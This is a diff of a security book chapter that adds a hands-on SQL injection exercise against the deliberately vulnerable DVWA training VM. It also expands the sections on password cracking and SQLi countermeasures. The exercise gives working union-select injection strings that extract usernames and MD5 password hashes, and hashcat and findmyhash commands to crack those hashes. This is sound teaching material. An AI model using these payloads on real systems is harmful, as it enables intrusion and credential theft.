@@ -213,8 +213,96 @@ _Todo_
 
 ![](images/HandsOnHack.png)
 
- One of the simplest and quickest vulnerabilities to fix, yet it is still top of the hit lists.  
- Lets hammer this home some more.
+ One of the simplest and quickest vulnerabilities to fix, yet it is still top of the hit lists. Lets hammer this home some more.
+
+I> ## Synopsis
+I>
+I> I have used the Dam Vulnerable Web Application (DVWA) from the OWASP Broken Web Applications [VM](http://sourceforge.net/projects/owaspbwa/files/) for this exercise. You can load this VM in a VMware product or add the virtual machine disk to a new VM in VirtualBox. It's an Ubuntu 64 bit image. Once you have your VM ready to boot, use the Host-only Adapter so it's sand-boxed from the rest of your network. You really would not want an attacker gaining access to this VM as it is purposely vulnerable and attacks could easily be launched from it.
+I>
+I> Start the machine.
+
+{icon=bomb}
+G> ## The Play
+G>
+G> In your Kali Linux box, run owasp-zap.  
+G> If chromium is not already running, run it and setup foxyproxy for chrome using the burp proxy we set-up in the [Tooling Setup](#tooling-setup-kali-linux-tools-i-use-that-need-adding-to-kali-linux-chromium-extensions-foxyproxy-standard) chapter. Zap is now recording your browsing.
+G>
+G> Once you have started the VM and browsed to it, select the DVWA and log in as user: "user", password "user". Make sure the Security Level is set to low.
+G>
+G> Navigate to the SQL Injecton page and enter `1` in the input box.
+G>
+G> In Zap: Right click on dvwa -> Attack -> Active Scan -> Start Scan
+G>
+G> When the scan is finished: go to the Alerts tab -> Select SQL Injection -> look at the request and response.  
+G> See Zap used a union query, but response said "The used SELECT statements have a different number of columns". Which means if we use the correct number of columns we will have success.  
+G>
+G> In Request tab select input parameter -> right click and select Fuzz -> Payloads -> Add -> Select File Fuzzers from "Type" dropdown. jbrofuzz->SQL Injection->SQL Injection -> Add -> OK -> Start Fuzzer
+G>
+G> Notice the `x' or full_name like '%bob%`
+G>
+G> Then try the following in dvwa input:
+G>
+G> `x' or full_name like '%bob%`  
+G> Output: Tells us we are in a where clause and I had an unknown column name.  
+G> Thanks MySQL error reporting!
+G>
+G> `x' or first_name like '%bob%`     # This works  
+G> `x' or last_name like '%smith%`    # This works  
+G> `x' or first_name like '%`         # And as expected, we get what we think are all users.
+G>
+G> Also the recon stage may tell us a lot about naming conventions and more. Once you know who the employees are:  
+G> Search stackoverflow, github, etc for tidbits. Also [gitrob](https://github.com/michenriksen/gitrob)  
+G> As we try different things, we learn more about naming conventions.
+G>
+G> `x' or user like '%`               # This works  
+G>
+G> I thought the query on the server looked something like this:
+`select ID, first_name, last_name from users where ID = ''`
+G>
+G> Time to work out what the table name is.
+G>
+G> Lets try users. I'm thinking that the full query will look like:  
+G> `select ID, first_name, last_name from users where ID = '1' union select ID, first_name, last_name from users where first_name like '%'`  
+G> Injected query:  
+G> `1' union select ID, first_name, last_name from users where first_name like '%`  
+G> Output: Unknown column 'ID'  
+G> Lets fix that  
+G> `1' union select user_id, first_name, last_name from users where first_name like '%`  
+G> Output: The used SELECT statements have a different number of columns.  
+G> This told me that the query on the server was slightly different to what I thought. My revised guess of the full query:  
+G> `select first_name, last_name from users where user_id = '1' union select first_name, last_name from users where first_name like '%'`  
+G> Injected query:  
+G> `1' union select first_name, last_name from users where first_name like '%`
+G>
+G> Now for the passwords:  
+G> Full server query guess:  
+G> `select first_name, last_name from users where user_id = '1' union select first_name, password from users where first_name like '%'`  
+G> Injected query:  
+G> `1' union select first_name, password from users where first_name like '%`
+G>
+G> Lets determine the hash type with hash-identifier. Just run it and throw the hash at it and it will tell you that it is most likely a simple MD5. which is a one-way hashing function with no Key derivation. So very quick to crack.
+G>
+G> So take your pick of the following two commands:  
+G> Create `./hashtocrack.txt` and put the hash(s) you want cracked in it. If you still have the wordlist we created in the [Brute Forcing](#people-identify-risks-weak-password-strategies-brute-forcing-hydra) section in the People chapter, just use it.  
+G> `hashcat -m 0 ./hashtocrack.txt ./wordlist-to-throw-at-dvwa`  
+G> `[algorithm]` in this case will be `MD5`
+G> `findmyhash [algorithm] -h <hash_value>`
+G> `-m 0` means MD5 to hashcat.  
+G> This gives us the super secure password of "admin"
+G>
+G> In order to get login, we actually need the username. In this case they were the same, but for some other users they were not. So our last query.  
+G> Full server query guess:  
+G> `select first_name, last_name from users where user_id = '1' union select user, password from users where first_name like '%'`  
+G> Injected query:  
+G> `1' union select user, password from users where first_name like '%`  
+G> Or simplified:  
+G> `1' union select user, password from users#'`
+G> Now we have our admin password and user.
+
+There are two main problems here.
+
+1. SQL Injection
+2. Poor decisions around sensitive data protection. We discuss this in depth further on in this chapter in the [Data-store Compromise](#web-applications-identify-risks-management-of-application-secrets-data-store-compromise) section and even more so the [Countermeasures](#web-applications-countermeasures-data-store-compromise) of. Please do not follow this example of a lack of well salted and quality strong key derivation functions (KDFs) used on all of the sensitive data.
 
 #### Command Injection {#web-applications-identify-risks-command-injection}
 
@@ -262,7 +350,7 @@ People submitting genuinely innocent input. If a person is prepared to fill out 
 * Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc, and may even provide credentials to continue moving through the network compromising other machines.
 * Passwords and/or their hashes travelling over the network. Also see the [Wire Inspecting](#network-identify-risks-wire-inspecting) section in the [Network](#network) chapter.
 
-#### Data-store Compromise
+#### Data-store Compromise {#web-applications-identify-risks-management-of-application-secrets-data-store-compromise}
 ![](images/ThreatTags/difficult-widespread-average-moderate.png)
 
 The reason I've tagged this as moderate is because if you take the countermeasures, it doesn't have to be a disaster.
@@ -282,6 +370,8 @@ There are many examples of data-store compromise happening on a daily basis. If 
 Other notable data-store compromises were [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) with 145 million active buyers. Many others coming to light regularly. 
 
 Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected.
+
+%% http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/How-Cracked-Windows-Password-Part2.html
 
 #### Physical Access
 
@@ -303,7 +393,9 @@ Remember we covered Password Profiling in the People chapter where we essentiall
 
 When an attacker acquires a data-store or domain controller dump of hashed passwords, they need to crack the hashes in order to get the passwords. How this works is the attacker will find or create a suitable password list of possible passwords. The tool used will attempt to create a hash of each of these words based on the hashing algorithm used on the dump of hashes. Then compare each dumped hash with the hashes just created. When a match is found, we know that the word in our wordlist used to create the hash that matches the dumped hash is in fact a legitimate password.
 
-The wordlist needs to be as small as possible obviously and should ideally not contain words that are unlikely to have matching hashes in the hash dump obtained.
+A smaller wordlist is going to take less time to create the hashes. As this is often an off-line attack, a larger wordlist is often preferred over a smaller one because the number of generated hashes will be greater, which when compared to the dump of hashes means the likelihood of a greater number of matches is increased.
+
+As part of the hands on hack in the [SQLi](#web-applications-identify-risks-sqli) section, we obtained the password hashes via SQL injection from the target web application DVWA (part of the OWASP Broken Web Application suite (VM)). We witnessed how an attacker could obtain the passwords from the hashed values retrieved from the database.
 
 
 %% See section in TheHackerPlaybook2 on Password Cracking
@@ -315,14 +407,14 @@ Cain and Abel (windows)
 _Todo_
 
 
-Resources:
+%% Resources:
 
-* DVWA? toastmasters example?
-* TheHackerPlaybook2 - Special Teams - Password Cracking
-* Owning the web presentation near the end
-* http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/How-Cracked-Windows-Password-Part2.html
-* John the Ripper vs Hashcat vs Ophcrack vs Findmyhash and Chntpw http://www.thesecurityblogger.com/how-hackers-crack-weak-passwords/
-* Hashcat http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/
+%% * DVWA? toastmasters example?
+%% * TheHackerPlaybook2 - Special Teams - Password Cracking
+%% * Owning the web presentation near the end
+%% * http://www.windowsecurity.com/articles-tutorials/authentication_and_encryption/How-Cracked-Windows-Password-Part2.html
+%% * John the Ripper vs Hashcat vs Ophcrack vs Findmyhash and Chntpw http://www.thesecurityblogger.com/how-hackers-crack-weak-passwords/
+%% * Hashcat http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/
 
 
 
@@ -822,7 +914,7 @@ Detail how we collect application statistics and send to graphite. Show real lif
 ### Lack of Input Validation, Filtering and Sanitisation {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation}
 ![](images/ThreatTags/PreventionAVERAGE.png)
 
-#### Generic
+#### Generic {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic}
 
 Your staple practises when it comes to defending against potentially dangerous input are validation and filtering. There are cases though when the business requires that input must be accepted that is dangerous yet still valid. This is where you will need to implement sanitisation. There is a lot more research and thought involved when you need to perform sanitisation, so the first cause of action should be to confirm that the specific dangerous yet valid input is in-fact essential.
 
@@ -2418,6 +2510,9 @@ There are a few options here:
 * Use prepared statements and/or parameterised queries
 * Consider using Stored Procedures
 * Read up on the [OWASP SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)
+* And even before any of these points above, make sure you have the generic input [Validation, Filtering and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic) that we have already discussed covered, so all user input is validated, filtered and sanitised both client and server side before it gets anywhere near your queries.
+
+There are plenty of easy to find and understand resources on the inter-webs around SQLi mitigations and the countermeasures are generally very easy to implement. So now you have no excuse.
 
 #### Command Injection {#web-applications-countermeasures-command-injection}
 
